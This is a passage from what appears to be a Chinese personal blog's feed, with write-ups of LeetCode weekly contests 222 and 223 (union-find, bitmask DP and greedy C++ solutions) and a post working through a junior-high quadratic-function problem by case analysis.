间的汉明距离是 <span class="number">2</span> ，二者有 <span class="number">2</span> 处元素不同，在下标 <span class="number">1</span> 和下标 <span class="number">2</span> 。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：source = [<span class="number">5</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">3</span>], target = [<span class="number">1</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">3</span>], allowedSwaps = [[<span class="number">0</span>,<span class="number">4</span>],[<span class="number">4</span>,<span class="number">2</span>],[<span class="number">1</span>,<span class="number">3</span>],[<span class="number">1</span>,<span class="number">4</span>]]</span><br><span class="line">输出：<span class="number">0</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>n == source.length == target.length</code></li><li><code>1 &lt;= n &lt;= 105</code></li><li><code>1 &lt;= source[i], target[i] &lt;= 105</code></li><li><code>0 &lt;= allowedSwaps.length &lt;= 105</code></li><li><code>allowedSwaps[i].length == 2</code></li><li><code>0 &lt;= ai, bi &lt;= n - 1</code></li><li><code>ai != bi</code></li></ul><h3 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/contest/weekly-contest-223/problems/minimize-hamming-distance-after-swap-operations/" target="_blank" rel="noopener">https://leetcode-cn.com/contest/weekly-contest-223/problems/minimize-hamming-distance-after-swap-operations/</a></p><h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 并查集</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol><li>首先同属于并查集的两个元素，可以通过无限次的交换，总能交换到特定的位置。</li><li>首先我们对<code>allowedSwaps</code>进行并查集合并，如果两个元素可以进行交换，则将其合并。将合并后的元素索引的集合进行遍历，同属于一个集合下面的元素的值依次加入集合，并进行统计。</li><li>对<code>target</code>数组进行遍历，如果当前索引的<code>i</code>所在的集合中存在与<code>target[i]</code>相同的元素，则对其进行减<code>1</code>操作即可。<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp; f,<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(f[x] != f[f[x]])  f[x] = f[f[x]];</span><br><span class="line">        <span class="keyword">return</span> f[x];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">uni</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp; f,<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> x1 = find(f,x);</span><br><span class="line">        <span class="keyword">int</span> y1 = find(f,y);</span><br><span class="line">        <span class="keyword">if</span>(x1 != y1) f[x1] = y1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minimumHammingDistance</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; source, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; target, <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; allowedSwaps)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = source.size();</span><br><span class="line">        <span class="keyword">int</span> n = allowedSwaps.size();</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; f(m);</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>,<span class="built_in">map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt; cnt;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; ++i) f[i] = i;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : allowedSwaps)&#123;</span><br><span class="line">            uni(f,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; ++i)&#123;</span><br><span class="line">            cnt[find(f,i)][source[i]]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; ++i)&#123;</span><br><span class="line">            <span class="keyword">int</span> root = find(f,i);</span><br><span class="line">            <span class="keyword">if</span>(cnt[root].count(target[i]))&#123;</span><br><span class="line">                cnt[root][target[i]]--;</span><br><span class="line">                <span class="keyword">if</span>(cnt[root][target[i]] == <span class="number">0</span>)&#123;</span><br><span class="line">                    cnt[root].erase(target[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                ans++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5639-完成所有工作的最短时间"><a href="#5639-完成所有工作的最短时间" class="headerlink" title="5639. 完成所有工作的最短时间"></a>5639. 完成所有工作的最短时间</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>给你一个整数数组 <code>jobs</code> ，其中 <code>jobs[i]</code> 是完成第 i 项工作要花费的时间。</p><p>请你将这些工作分配给 k 位工人。所有工作都应该分配给工人，且每项工作只能分配给一位工人。工人的 工作时间 是完成分配给他们的所有工作花费时间的总和。请你设计一套最佳的工作分配方案，使工人的 最大工作时间 得以 最小化 。<br>返回分配方案中尽可能 最小 的 最大工作时间 。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：jobs = [<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>], k = <span class="number">3</span></span><br><span class="line">输出：<span class="number">3</span></span><br><span class="line">解释：给每位工人分配一项工作，最大工作时间是 <span class="number">3</span> 。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：jobs = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">8</span>], k = <span class="number">2</span></span><br><span class="line">输出：<span class="number">11</span></span><br><span class="line">解释：按下述方式分配工作：</span><br><span class="line"><span class="number">1</span> 号工人：<span class="number">1</span>、<span class="number">2</span>、<span class="number">8</span>（工作时间 = <span class="number">1</span> + <span class="number">2</span> + <span class="number">8</span> = <span class="number">11</span>）</span><br><span class="line"><span class="number">2</span> 号工人：<span class="number">4</span>、<span class="number">7</span>（工作时间 = <span class="number">4</span> + <span class="number">7</span> = <span class="number">11</span>）</span><br><span class="line">最大工作时间是 <span class="number">11</span> 。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= k &lt;= jobs.length &lt;= 12</code></li><li><code>1 &lt;= jobs[i] &lt;= 107</code></li></ul><h3 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/contest/weekly-contest-223/problems/find-minimum-time-to-finish-all-jobs/" target="_blank" rel="noopener">https://leetcode-cn.com/contest/weekly-contest-223/problems/find-minimum-time-to-finish-all-jobs/</a></p><h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><blockquote><p> dp + 子集遍历</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>常规的<code>dp</code>，类似的<code>dp</code>和<code>子集遍历</code>非常常见的题目了，基本都是套路,$dp[i][mask]$表示在集合<code>mask</code>下状态的<code>job</code>集合，由<code>i</code>个工人完成时所需的最小时间。<script type="math/tex; mode=display">dp[i][mask] = min(dp[i][mask],max(dp[i-1][mask1],cost[mask^mask1])) \\\left\{ mask1 \right \} \in \left\{ mask \right \}</script>如果熟悉子集遍历的方法的话，遍历所有属于<code>mask</code>的子集即可。</li><li>空间复杂度为$O(k<em>2^{n})$,时间复杂度为$O(k</em>3^{n})$,本质类似的题目都有套路。<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> dp[<span class="number">13</span>][<span class="number">5000</span>];</span><br><span class="line"><span class="keyword">int</span> cost[<span class="number">5000</span>];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minimumTimeRequired</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; jobs, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = jobs.size();</span><br><span class="line">        <span class="keyword">int</span> mask = (<span class="number">1</span>&lt;&lt;n)<span class="number">-1</span>;</span><br><span class="line">        <span class="built_in">memset</span>(dp,INF,<span class="keyword">sizeof</span>(dp));</span><br><span class="line">        <span class="built_in">memset</span>(cost,<span class="number">0</span>,<span class="keyword">sizeof</span>(cost));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/*intial*/</span></span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= k; ++i) dp[i][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; (<span class="number">1</span>&lt;&lt;n); ++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; ++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i&amp;(<span class="number">1</span>&lt;&lt;j)) cost[i] += jobs[j];</span><br><span class="line">            &#125;</span><br><span class="line">            dp[<span class="number">1</span>][i] = cost[i];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= k; ++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= mask; ++j)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> l = j; l != <span class="number">0</span>; l = (l<span class="number">-1</span>)&amp;j)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(dp[i<span class="number">-1</span>][j^l] != INF)</span><br><span class="line">                        dp[i][j] = min(dp[i][j],max(dp[i<span class="number">-1</span>][j^l],cost[l]));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> dp[k][(<span class="number">1</span>&lt;&lt;n)<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id><a href="#" class="headerlink" title="#"></a>#</h2><p>欢迎关注和打赏，感谢支持！</p><ul><li>关注我的博客: <a href="http://mikemeng.org/" target="_blank" rel="noopener">http://mikemeng.org/</a></li><li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu" target="_blank" rel="noopener">https://www.zhihu.com/people/da-hua-niu</a></li><li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;leetcode-weekly-contest-223&quot;&gt;&lt;a href=&quot;#leetcode-weekly-contest-223&quot; class=&quot;headerlink&quot; title=&quot;leetcode  weekly contest 223&quot;&gt;&lt;/a&gt;leetcode  weekly contest 223&lt;/h1&gt;&lt;p&gt;周赛的题目正很多，题意也直接简单很多，常规题目，特别是最后一题，已经是套路题目了。&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2021/01/10/poLKCDi4dzeNYsh.png&quot; alt&gt;&lt;/p&gt;&lt;h2 id=&quot;5649-解码异或后的数组&quot;&gt;&lt;a href=&quot;#5649-解码异或后的数组&quot; class=&quot;headerlink&quot; title=&quot;5649. 解码异或后的数组&quot;&gt;&lt;/a&gt;5649. 解码异或后的数组&lt;/h2&gt;&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;未知 整数数组 &lt;code&gt;arr&lt;/code&gt; 由 &lt;code&gt;n&lt;/code&gt; 个非负整数组成。&lt;/p&gt;&lt;p&gt;经编码后变为长度为 &lt;code&gt;n - 1&lt;/code&gt; 的另一个整数数组 &lt;code&gt;encoded&lt;/code&gt;，其中 &lt;code&gt;encoded[i] = arr[i] XOR arr[i + 1]&lt;/code&gt; 。例如，&lt;code&gt;arr = [1,0,2,1]&lt;/code&gt; 经编码后得到 &lt;code&gt;encoded = [1,2,3]&lt;/code&gt; 。&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>【数学】  数学题目</title>
    <link href="http://yoursite.com/2021/01/05/241/"/>
    <id>http://yoursite.com/2021/01/05/241/</id>
    <published>2021-01-05T13:36:21.796Z</published>
    <updated>2021-01-05T14:54:05.421Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>在知乎上偶尔看到一道初中数学题目，所以觉得非常有意思，专门拿出来讨论下。<br><img src="https://i.loli.net/2021/01/05/1EapTUuz9iZXMmw.png" alt="1"></p><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>分类讨论如下：</p><ol><li>根据函数经过<code>(0,2),(1,3)</code>两个点,代入以后可以得到如下等式：<script type="math/tex; mode=display">c = 2 \\a + b = 1 \\</script>因此上述函数可以转换为$y = ax^{2} + (1-a)x+2$</li><li>当且仅当$-1\le x \le 1$时，$|ax^{2} + (1-a)x+2| = 2$仅只有一个解，根据题目中的条件我们知道$|ax^{2} + (1-a)x+2| = 2$目前已经的根为$x=0$,因此我们可以知道以下等式:<script type="math/tex; mode=display">|ax^{2} + (1-a)x+2| = 2</script>在$-1\le x \le 1$有且仅有$x=0$这一个根，要么等式存在其他的根，且其它的根应当满足$x\le -1 , x \ge 1$;要么等式不存在其他的根。我们分情况来讨论，我们首先将上述等式的绝对值拆开，分解为：<script type="math/tex; mode=display">ax^{2} + (1-a)x  = 0 \qquad (1) \\ax^{2} + (1-a)x + 4 = 0 \qquad (2)</script></li></ol><a id="more"></a><ul><li>首先判断当$a = 0$时，上述两个方程均为一次方程，显然只有<code>(1)</code>式存在一个根为$x = 0$</li><li>当$a \neq 0$ 时，上述等式<code>1</code>与等式<code>2</code>都可能存在两个根。</li><li><ul><li>等式<code>(1)</code>一定存在两个根，分别为$x_{1} = 0,x_{2} = \frac{a-1}{a}$，要们$x_{2} = 0$,要么$x_{2} &gt; 1 ,x_{2} &lt; -1$. </li></ul></li><li><ul><li>等式<code>(2)</code>要么不存在实数的根，要么两个根分布如下：<script type="math/tex; mode=display">x_{1} < -1 , x_{2} > 1 \\x_{1} > 1 , x_{2} > 1 \\x_{1} < -1 , x_{2} < -1\\</script></li></ul></li></ul><ol><li>我们将$a$分开来讨论：</li></ol><ul><li>当$a = 0$,式<code>(1)</code>存在根为$x=0$,式<code>(2)</code>不存在根，符合题目要求；</li><li>当$a &gt; 0$时：</li><li><ul><li>当$a = 1$时，显然式<code>1</code>的两个根都为<code>0</code>，式<code>2</code>不存在根，所以符合题目要求。</li></ul></li><li><ul><li>当$a\neq 1$，首先可以判定$\frac{a-1}{a} &lt; 1$,则此时只能满足$\frac{a-1}{a} &lt; -1$,求出此时<code>a</code>的范围为$0 &lt; a &lt; \frac{1}{2}$.<br>将上述的$a$的范围.$0&lt; a &lt; \frac{1}{2}$代入到式<code>(2)</code>中发现无解，符合题目要求，即式<code>(1)</code>仅有一个解在$-1\le x \le 1$，且式<code>(2)</code>无解。此时当$a \in (0,\frac{1}{2})$符合题目要求。</li></ul></li><li>当$a &lt; 0$时:</li><li><ul><li>当$a &lt; 0$，首先可以判定$\frac{a-1}{a} &gt; 1$一定成立。则此时我们就需要考虑式<code>2</code>的两个根的情况，我们可以知道式<code>2</code>的根判别式为:<script type="math/tex; mode=display">(1-a)^{2} - 16a > a</script>则当$a &lt; 0$，此时一定存在两个实根分别为，且满足：<script type="math/tex; mode=display">x_{1} = \frac{a-1+\sqrt{(a-1)^{2}-16a}}{2a} \\x_{2} = \frac{a-1-\sqrt{(a-1)^{2}-16a}}{2a} \\x_{1} < 0 < x_{2} \\</script>则此时，我们需要判定以下三种情况分别成立时，<code>a</code>的取值范围：<script type="math/tex; mode=display">x_{1} < x_{2} < -1  \qquad (a)\\1 < x_{1} < x_{2}  \qquad (b)\\x_{1} < -1 , x_{2} > 1 \qquad (c)\\</script>根据简要的判别我们可以知道$(a),(b)$均不可能成立，因此只有$(c)$可能成立，我们求出不等式$c$中<code>a</code>的取值范围如下：<script type="math/tex; mode=display">\frac{-3}{2} < a < 0</script></li></ul></li></ul><ol><li>综上可知，$a$的取值范围为：<script type="math/tex; mode=display">a \in (\frac{-3}{2},\frac{1}{2})\cup{1}</script></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h1&gt;&lt;p&gt;在知乎上偶尔看到一道初中数学题目，所以觉得非常有意思，专门拿出来讨论下。&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2021/01/05/1EapTUuz9iZXMmw.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;&lt;h2 id=&quot;解题思路&quot;&gt;&lt;a href=&quot;#解题思路&quot; class=&quot;headerlink&quot; title=&quot;解题思路&quot;&gt;&lt;/a&gt;解题思路&lt;/h2&gt;&lt;p&gt;分类讨论如下：&lt;/p&gt;&lt;ol&gt;
&lt;li&gt;根据函数经过&lt;code&gt;(0,2),(1,3)&lt;/code&gt;两个点,代入以后可以得到如下等式：&lt;script type=&quot;math/tex; mode=display&quot;&gt;
c = 2 \\
a + b = 1 \\&lt;/script&gt;因此上述函数可以转换为$y = ax^{2} + (1-a)x+2$&lt;/li&gt;
&lt;li&gt;当且仅当$-1\le x \le 1$时，$|ax^{2} + (1-a)x+2| = 2$仅只有一个解，根据题目中的条件我们知道$|ax^{2} + (1-a)x+2| = 2$目前已经的根为$x=0$,因此我们可以知道以下等式:&lt;script type=&quot;math/tex; mode=display&quot;&gt;
|ax^{2} + (1-a)x+2| = 2&lt;/script&gt;在$-1\le x \le 1$有且仅有$x=0$这一个根，要么等式存在其他的根，且其它的根应当满足$x\le -1 , x \ge 1$;要么等式不存在其他的根。我们分情况来讨论，我们首先将上述等式的绝对值拆开，分解为：&lt;script type=&quot;math/tex; mode=display&quot;&gt;
ax^{2} + (1-a)x  = 0 \qquad (1) \\
ax^{2} + (1-a)x + 4 = 0 \qquad (2)&lt;/script&gt;&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="数学" scheme="http://yoursite.com/tags/%E6%95%B0%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>【Leetcode】  周赛222场</title>
    <link href="http://yoursite.com/2021/01/03/240/"/>
    <id>http://yoursite.com/2021/01/03/240/</id>
    <published>2021-01-03T04:56:08.154Z</published>
    <updated>2021-01-03T06:52:09.031Z</updated>
    
    <content type="html"><![CDATA[<h1 id="leetcode-weekly-contest-222"><a href="#leetcode-weekly-contest-222" class="headerlink" title="leetcode  weekly contest 222"></a>leetcode  weekly contest 222</h1><p>周赛的题目，最后一题还是思路很慢，思考了半天竟然没有想到最长递增子序列<code>LIS</code>问题。年龄大了，真心感觉思维越来越不行。<br><img src="https://i.loli.net/2021/01/03/uUjfexl9cq28YHW.png" alt="1"></p><h2 id="5641-卡车上的最大单元数"><a href="#5641-卡车上的最大单元数" class="headerlink" title="5641. 卡车上的最大单元数"></a>5641. 卡车上的最大单元数</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>请你将一些箱子装在 一辆卡车 上。给你一个二维数组 <code>boxTypes</code> ，其中 <code>boxTypes[i] = [numberOfBoxesi, numberOfUnitsPerBoxi]</code> ：</p><a id="more"></a><p><code>numberOfBoxesi</code> 是类型 i 的箱子的数量。<br><code>numberOfUnitsPerBoxi</code> 是类型 i 每个箱子可以装载的单元数量。<br>整数 <code>truckSize</code> 表示卡车上可以装载 箱子 的 最大数量 。只要箱子数量不超过 <code>truckSize</code>，你就可以选择任意箱子装到卡车上。</p><p>返回卡车可以装载 单元 的 最大 总数。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入：boxTypes = [[<span class="number">1</span>,<span class="number">3</span>],[<span class="number">2</span>,<span class="number">2</span>],[<span class="number">3</span>,<span class="number">1</span>]], truckSize = <span class="number">4</span></span><br><span class="line">输出：<span class="number">8</span></span><br><span class="line">解释：箱子的情况如下：</span><br><span class="line">- <span class="number">1</span> 个第一类的箱子，里面含 <span class="number">3</span> 个单元。</span><br><span class="line">- <span class="number">2</span> 个第二类的箱子，每个里面含 <span class="number">2</span> 个单元。</span><br><span class="line">- <span class="number">3</span> 个第三类的箱子，每个里面含 <span class="number">1</span> 个单元。</span><br><span class="line">可以选择第一类和第二类的所有箱子，以及第三类的一个箱子。</span><br><span class="line">单元总数 = (<span class="number">1</span> * <span class="number">3</span>) + (<span class="number">2</span> * <span class="number">2</span>) + (<span class="number">1</span> * <span class="number">1</span>) = <span class="number">8</span></span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：boxTypes = [[<span class="number">5</span>,<span class="number">10</span>],[<span class="number">2</span>,<span class="number">5</span>],[<span class="number">4</span>,<span class="number">7</span>],[<span class="number">3</span>,<span class="number">9</span>]], truckSize = <span class="number">10</span></span><br><span class="line">输出：<span class="number">91</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= boxTypes.length &lt;= 1000</code></li><li><code>1 &lt;= numberOfBoxesi, numberOfUnitsPerBoxi &lt;= 1000</code></li><li><code>1 &lt;= truckSize &lt;= 106</code></li></ul><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/maximum-units-on-a-truck" target="_blank" rel="noopener">https://leetcode-cn.com/problems/maximum-units-on-a-truck</a></p><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>  贪心</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>背包问题，贪心算法即可，将价值最高的箱子有限选择即可。<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maximumUnits</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; boxTypes, <span class="keyword">int</span> truckSize)</span> </span>&#123;</span><br><span class="line">        sort(boxTypes.begin(),boxTypes.end(),[&amp;](<span class="keyword">const</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp; a,<span class="keyword">const</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp; b)&#123;</span><br><span class="line">           <span class="keyword">return</span> a[<span class="number">1</span>] &gt; b[<span class="number">1</span>]; </span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; boxTypes.size(); ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(truckSize &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">int</span> curr = min(truckSize,boxTypes[i][<span class="number">0</span>]);</span><br><span class="line">                ans += curr*boxTypes[i][<span class="number">1</span>];</span><br><span class="line">                truckSize -= curr;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5642-大餐计数"><a href="#5642-大餐计数" class="headerlink" title="5642. 大餐计数"></a>5642. 大餐计数</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>大餐 是指 恰好包含两道不同餐品 的一餐，其美味程度之和等于 2 的幂。</p><p>你可以搭配 任意 两道餐品做一顿大餐。</p><p>给你一个整数数组 <code>deliciousness</code> ，其中 <code>deliciousness[i]</code>是第 i​​​​​​​​​​​​​​ 道餐品的美味程度，返回你可以用数组中的餐品做出的不同 大餐 的数量。结果需要对 <code>109 + 7</code>取余。</p><p>注意，只要餐品下标不同，就可以认为是不同的餐品，即便它们的美味程度相同。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：deliciousness = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>]</span><br><span class="line">输出：<span class="number">4</span></span><br><span class="line">解释：大餐的美味程度组合为 (<span class="number">1</span>,<span class="number">3</span>) 、(<span class="number">1</span>,<span class="number">7</span>) 、(<span 